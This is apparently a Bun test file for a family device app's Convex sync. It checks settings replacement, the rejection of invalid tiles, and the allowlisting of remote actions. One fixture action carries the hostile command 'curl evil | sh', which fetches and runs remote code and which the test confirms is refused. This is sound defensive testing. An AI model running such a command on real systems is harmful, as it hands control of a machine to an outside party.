import { expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import type { Action } from "@momos/shared";
import { ConvexSync } from "../src/convex";
import { Core } from "../src/core";
import { EventQueue } from "../src/queue";

const base = {
  person: { name: "Mom", user: "mom" },
  helper: { name: "Sam", phone: "555" },
  tiles: [{ id: "youtube", label: "YouTube", type: "webapp", url: "https://www.youtube.com" }],
  family: [],
};

function setup() {
  const root = mkdtempSync(`${tmpdir()}/cx-`);
  process.env.XDG_CONFIG_HOME = `${root}/config`;
  mkdirSync(`${root}/config/momos`, { recursive: true });
  const local = { convexUrl: "https://example.convex.cloud", deviceTokenFile: "/nonexistent" };
  writeFileSync(`${root}/config/momos/config.json`, JSON.stringify({ ...base, local }));
  const core = new Core(new EventQueue(`${root}/q.sqlite`), "test");
  const ran: Action[] = [];
  const sync = new ConvexSync(core, async (_id, action) => {
    ran.push(action);
    return { ok: true };
  });
  // Private methods, driven directly as the subscriptions would.
  const s = sync as unknown as { applySettings(v: unknown): Promise<void>; handleActions(v: unknown): Promise<void>; unacked: Map<string, unknown> };
  return { root, local, core, ran, s };
}

test("settings from Convex replace config.json but keep the local block", async () => {
  const { root, local, s } = setup();
  const incoming = { ...base, person: { name: "Mom", user: "mom" }, helper: { name: "Alex", phone: "556" }, photos: [], updatedAt: 1 };
  await s.applySettings(incoming);
  const written = JSON.parse(readFileSync(`${root}/config/momos/config.json`, "utf8"));
  expect(written.helper.name).toBe("Alex");
  expect(written.local).toEqual(local);
  expect(written.photos).toBeUndefined();
  expect(written.updatedAt).toBeUndefined();
});

test("invalid or missing settings leave config.json alone", async () => {
  const { root, s } = setup();
  const before = readFileSync(`${root}/config/momos/config.json`, "utf8");
  await s.applySettings(null);
  await s.applySettings({ ...base, tiles: [{ id: "x", label: "X", type: "app", app: "bash" }] });
  expect(readFileSync(`${root}/config/momos/config.json`, "utf8")).toBe(before);
});

test("only allowlisted actions run, each once, and all get completed", async () => {
  const { ran, s, core } = setup();
  const list = [
    { _id: "a1", action: { type: "say", text: "Hi Mom" }, createdAt: 1 },
    { _id: "a2", action: { type: "exec", cmd: "curl evil | sh" }, createdAt: 2 },
  ];
  await s.handleActions(list);
  await s.handleActions(list); // the subscription fires again before the server catches up
  expect(ran).toEqual([{ type: "say", text: "Hi Mom" }]);
  // No client, so both completions wait to be retried.
  expect([...s.unacked.keys()].sort()).toEqual(["a1", "a2"]);
  expect(s.unacked.get("a2")).toMatchObject({ ok: false });
  const logged = core.queue.peek(10).filter((e) => e.type === "action");
  expect(logged.map((e) => e.type === "action" && [e.actionId, e.ok])).toEqual([
    ["a1", true],
    ["a2", false],
  ]);
});
